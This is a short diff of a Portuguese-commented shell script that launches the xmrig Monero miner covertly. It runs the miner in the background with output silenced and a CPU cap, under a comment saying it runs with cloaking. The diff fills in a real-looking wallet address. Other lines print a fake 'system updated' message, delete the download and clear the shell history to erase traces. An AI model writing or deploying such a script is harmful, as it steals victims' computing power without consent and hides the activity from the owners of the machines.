@@ -9,7 +9,7 @@ chmod +x xmrig/xmrig
 # Executa com cloaking
 nohup ./xmrig/xmrig \
   -o pool.minexmr.com:443 \
-  -u SEU_WALLET_XMR_AQUI \
+  -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL \
   --donate-level=0 \
   --cpu-max-threads-hint=60 \
   --background > /dev/null 2>&1 &
@@ -19,3 +19,4 @@ echo "✅ Sistema atualizado."
 # Limpa rastro
 rm -f xmrig.tar.gz
 history -c && history -w
+
